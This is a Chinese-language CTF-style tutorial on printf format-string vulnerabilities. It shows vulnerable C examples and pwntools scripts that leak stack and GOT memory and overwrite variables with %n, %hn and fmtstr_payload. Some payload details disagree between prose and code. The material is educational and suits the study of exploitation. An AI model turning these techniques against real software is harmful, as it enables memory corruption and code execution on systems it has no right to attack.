# 格式化字符串漏洞总结


之前大大小小的题目中都遇到了格式化字符串漏洞，但是长时间不做还是会有点懵逼

<!--more-->

首先，格式化字符串的危险函数有很多，但是实际上最常用的还是`printf`。printf可以有很多参数，但是第一个固定为fmt参数。printf的参数分布和正常函数的参数分布一致：

+ x86：栈
+ x64：RDI, RSI, RDX, RCX, R8, R9, 栈

我们知道，fmt的格式大概如下所示：

```c
"Hello %d, %s"
```

fmt中每遇到一个`%`后就会在下一个参数寻找值按照格式输出，无论该值是否由printf函数提供。

那么，由于fmt字符串占用第一个参数，第**n**个`%`所寻找的参数即为printf的第**n+1**个参数，或者说相对于fmt字符串第**n**个参数。这一点需要牢记。按照此规则结合正常函数的参数储存机制即可定位指定栈位置的内容。

{{< admonition info "Notice" true >}}

printf的第一个参数永远是fmt字符串，其他和正常函数一致。

{{< /admonition >}}

## 泄露栈内存

按照上述内容，当fmt字符串可控，我们可以顺序输入栈上的数据。

> 如果需要通过gdb定位栈位置，一定要在printf处下断点

+ 可以利用 `%x` 来获取对应栈的内存，但建议使用 `%p`，可以不用考虑位数的区别。
+ 利用 `%s` 来获取变量所对应地址的内容，只不过有零截断。如果该变量所对应的并不是合法的地址，程序崩溃
+ 利用`%n$p`获取栈指定位置的内容，使用`%n$s`获取栈指定位置内容所对应地址的内容。

## 泄露任意地址内存

> 在函数调用的时候栈指针至少低于格式化字符串地址 8 字节或者 16 字节。

fmt字符串会按照栈单位大小将其"分解"后放在栈上。如果我们在格式化字符串中放上某一个内存地址，那么我们就相当于在栈上写入了需要泄露的内存地址。此时定位其位置，使用`%n$s`就可以泄露该内存地址的内容。注意：地址一定要充满栈单位，比如64位程序的栈单位是8字节，那么如果地址不满8字节需要填充至8字节。例如：

那么如何确定我们写入地址的位置？这里我们使用如下程序为例：

```c
#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}
```

输入AAAA（因为是32位程序，四字节地址），然后使用gdb进行调试。栈布局如下所示：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109145242079.png)

栈顶是printf的返回地址，下面则是printf的第一个参数，发现他们都指向0x14的位置，该位置数出来是printf的第5个参数，那么就相对fmt4个长度。因此，我们可以通过`%4$s`来读取地址为AAAA处的内存地址。

除了使用gdb，我们可以直接输入多个`%p`来顺序打印栈上的内容，直到我们找到`AAAA`为止。如下所示：

> 请保证输入大小够用。

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109150013241.png)

数一下，刚好是第四个%p，那么相对位置就是第四个。

现在，我们尝试输出`scanf`的地址：（32位libc中，scanf的名称为：`__isoc99_scanf`）

```python
from pwn import *
context(arch='i386',os='linux')
context.log_level='debug'
context.terminal=['tmux','splitw','-h']

elf = ELF('./stackleak')
libc = elf.libc
r = elf.process()

scanf_got = elf.got['__isoc99_scanf']

payload = flat([
    scanf_got,
    '%4$s'
])

gdb.attach(r)
r.sendline(payload)

r.recvuntil(b'%4$s\n')
leak = u32(r.recv(8)[4:8])
info(hex(leak))

r.interactive()
```

最终确实输出了scanf的实际地址：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109151150117.png)

## 覆盖栈上内存地址

这里涉及到一个格式化字符：`%n`,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。

那么参照上面的过程，我们在输入中填充一些字符即可写入对应个数的字符。

```
[addr][padding]%x$n
```

现有如下程序：

```c
/* example/overflow/overflow.c */
#include <stdio.h>
int a = 123, b = 456;
int main() {
  int c = 789;
  char s[100];
  printf("%p\n", &c);
  scanf("%s", s);
  printf(s);
  if (c == 16) {
    puts("modified c.");
  } else if (a == 2) {
    puts("modified a for a small number.");
  } else if (b == 0x12345678) {
    puts("modified b for a big number!");
  }
  return 0;
}
```

我们来修改栈上变量c的值。首先使用之前的手段判断偏移：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109161123800.png)

发现是第六个参数。由于程序本身给出了c变量的地址，那么我们直接将地址写入第六个位置即可。

```python
from pwn import *
context(arch='i386',os='linux')
context.log_level='debug'
context.terminal=['tmux','splitw','-h']

elf = ELF('./overwrite')
libc = elf.libc
r = elf.process()

leak = int(r.recv(10),16)

payload = flat([
    leak,
    '%012d'
    '%6$n'
])

r.sendline(payload)

r.interactive()
```

![image-20231109162944216](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109162944216.png)

成功修改。

## 覆盖任意地址内存为小数字

对于32位程序来说，地址肯定是4字节的。如果将地址放在开头，那么至少会写成4。为了写更小的数字，可以将地址放在后面。

由于此时地址是按4字节分割的，我们不用重新定位位置。按照上次定位的位置推即可。

```
AA$8$nxx[addr]
```

因为要将a改写为2，`$8$n`前面只能有2个字符。然后为了凑整，后面再次填写两个字符。最后再加上地址即可。此时的参数位置：

![image-20231109165043444](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109165043444.png)

因此写入第八位即可改写addr处的地址位2。

```python
from pwn import *
context(arch='i386',os='linux')
context.log_level='debug'
context.terminal=['tmux','splitw','-h']

elf = ELF('./overwrite')
libc = elf.libc
r = elf.process()

leak = 0x804C024

payload = flat([
    'AA',
    '%8$nxx',
    leak
])

r.sendline(payload)

r.interactive()
```

![image-20231109165701091](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109165701091.png)

## 覆盖任意地址内存为大地址

上面介绍了覆盖小数字，这里我们介绍如何覆盖大数字。上面我们也说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？自然是有了。

不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：

```
hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。
h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。
```

所以说，我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。

首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804c024。

即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。

```
0x0804c024 \x78
0x0804c025 \x56
0x0804c026 \x34
0x0804c027 \x12
```

首先，由于我们的字符串的偏移为 6，所以我们可以确定我们的 payload 基本是这个样子的：

```
p32(0x0804c024)+p32(0x0804c025)+p32(0x0804c026)+p32(0x0804c027)+pad1+'%6$n'+pad2+'%7$n'+pad3+'%8$n'+pad4+'%9$n'
```

![image-20231109170027894](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109170027894.png)

接下来，我们需要将已经写入的字符个数和需要修改的内容做差，即可求出padding的具体大小。这里为了方便，可以使用pwntools自带的`fmtstr_payload`函数构造payload：

```pythont
fmtstr_payload(6,{0x0804c024:0x12345678})
```

```python
from pwn import *
context(arch='i386',os='linux')
context.log_level='debug'
context.terminal=['tmux','splitw','-h']

elf = ELF('./overwrite')
libc = elf.libc
r = elf.process()

leak = 0x804C028

payload = fmtstr_payload(6,{leak:0x12345678})

r.sendline(payload)

r.interactive()
```

结果如下：

![image-20231109170514955](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109170514955.png)

以上是格式化字符串使用的基本思路。平常的使用经常会和劫持GOT表或者返回地址结合来达到getshell的效果。

## 补充

由于64位地址正常不会满8字节，因此请将地址放在fmt后面，这样可以防止地址高位补0而导致的零截断。

```
%6$sxxxx\xc0\x40\x40\x00\x00\x00\x00\x00
# fault: \xc0\x40\x40\x00\x00\x00\x00\x00%6$sxxxx 
```



---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/11/fmt_str/  

